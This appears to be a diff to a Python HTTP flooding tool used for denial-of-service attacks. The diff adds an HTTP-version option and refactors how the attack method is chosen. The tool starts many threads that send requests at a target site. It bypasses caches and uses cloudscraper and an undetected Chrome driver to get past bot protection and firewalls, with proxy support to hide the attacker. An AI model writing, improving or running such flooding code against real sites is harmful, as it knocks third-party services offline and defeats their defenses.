@@ -27,9 +27,11 @@ else:
   parser.add_argument('-bc',  '--bypass-cache',   dest = 'bypass_cache',    default = False,    help='Bypass the cache of the site', action='store_true')
   parser.add_argument('-m',   '--method',         dest = 'method',          default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
   parser.add_argument('-dfw', '--detect-firewall',dest = 'detect_firewall', default = False,    help='Detect if the target site is protected by a firewall', action='store_true')
+  parser.add_argument(        '--http-version',   dest = 'version',         default = '1.1',    help='HTTP version (default: 1.1)', type=str)
   args = vars(parser.parse_args())
 
   debug = args['debug']
+  attack_method = args['method'].upper()
 
 try:
   from timeit import default_timer as timer
@@ -42,10 +44,11 @@ except:
 print('[INFO] Importing modules, hold on.')
 try:
   if debug: s_start = timer()
-  import os, threading, json, time, requests, cloudscraper, random, netaddr, selenium, undetected_chromedriver
+  import os, threading, json, time, requests, cloudscraper, random, netaddr, selenium, undetected_chromedriver,ssl
   from colorama import Fore, init
   from urllib.parse import urlparse
   from requests.cookies import RequestsCookieJar
+  from http.client import HTTPConnection
   if debug: 
     s_took = "%.2f" % (1000 * (timer() - s_start))
     print(f'[DEBUG] Importing modules took {str(s_took)} ms.')
@@ -89,11 +92,12 @@ if args['target'] is None:
   print(f'[ERROR] No target specified.')
   exit()
 
-if not args['method'].upper() in method_dict.keys():
+if not attack_method.upper() in method_dict.keys():
   print(f'[ERROR] Invalid method.')
   exit()
 
 Core.bypass_cache = args['bypass_cache']
+Core.http_version = args['version']
 Core.proxy_file = args['proxy_file_path']
 Core.proxy = args['proxy']
 Core.proxy_type = args['proxy_type'].upper() # this here fixed the issue for IP leaks when using lowercase proxy types, eg; http instead of HTTP
@@ -107,7 +111,7 @@ if args['proxy'] != None and args['detect_firewall']:
 
   if yorn.startswith('N'): args['detect_firewall'] = False
   else: print('Alright, i warned ya!')
-  time.sleep(2) # a small timeout if the user reconsiders his choice
+  time.sleep(2) # a small timeout if the user reconsiders his choice so he can CTRL-C or close the tool
 
 init(autoreset=True) # initialize console
 
@@ -163,8 +167,10 @@ def attack():
       resolved_host = f'[{resolved_host}]' # adding this allows requests to send data to IPv6 addresses too 
   else: resolved_host = parsed.netloc
 
+  HTTPConnection._http_vsn_str = f"HTTP/{str(Core.http_version)}" # sets HTTP version
+
   sessobj = createsession()
-  if args['method'] == 'BYPASS':
+  if attack_method == 'BYPASS':
 
     if get_cookie(args['target']):
       scraper = cloudscraper.create_scraper(sess=requests.session())
@@ -176,33 +182,31 @@ def attack():
     else: 
       print('Failed to get cookies'); os.kill(os.getpid(), 9)
       
-  elif args['method'] == 'PROXY': # define the proxy type as session object (saves me some lines to code)
+  elif attack_method == 'PROXY': # define the proxy type as session object (saves me some lines to code)
     sessobj = socks.SOCKS4 if 'SOCKS4' in Core.proxy_type else socks.HTTP if 'HTTP' in Core.proxy_type else socks.SOCKS5
-  else:
-    pass
-  
-  Core.attack_clear_to_go = True
+  else: pass
 
   s_start = timer() # timer used for counting avg rps
   for i in range(int(args['workers'])):
     Core.infodict.update({str(i): {'req_sent': 0, 'req_fail': 0, 'req_total':0}})
-    kaboom = threading.Thread(target=method_dict[args['method']], args=(str(i), sessobj, f'{parsed.scheme}://{resolved_host}', args['duration'], args['useragent'], args['referer'], ), daemon=True)
+    kaboom = threading.Thread(target=method_dict[attack_method], args=(str(i), sessobj, f'{parsed.scheme}://{resolved_host}', args['duration'], args['useragent'], args['referer'], ), daemon=True)
     kaboom.start()
 
     Core.threadbox.append(kaboom)
     Core.threadcount += 1
+  
+  Core.attack_clear_to_go = True # All threads have launched, time to print our shit!
   
   for kaboom in Core.threadbox:
     kaboom.join()
   
   Core.attackrunning = False
   s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
-  total_rqs = 0
+  Core.attack_length = s_took
 
+  total_rqs = 0
   for _, workervalue in Core.infodict.items():
     total_rqs += workervalue['req_sent']
-
-  Core.attack_length = s_took
   Core.avg_rps = float(total_rqs)/float(s_took)
 
 if __name__ == '__main__':
@@ -216,7 +220,7 @@ if __name__ == '__main__':
   Core.attackrunning = True
 
   while not Core.attack_clear_to_go: # while attack is not launching yet
-    time.sleep(1)
+    time.sleep(0.5)
 
   clear()
 
@@ -252,7 +256,7 @@ if __name__ == '__main__':
      Core.attackrunning = False
     
     try:
-      time.sleep(2 if args['method'].upper() != 'LEECH' else 10)
+      time.sleep(2 if attack_method.upper() != 'LEECH' else 10)
       if Core.attackrunning: 
         clear()
     except:
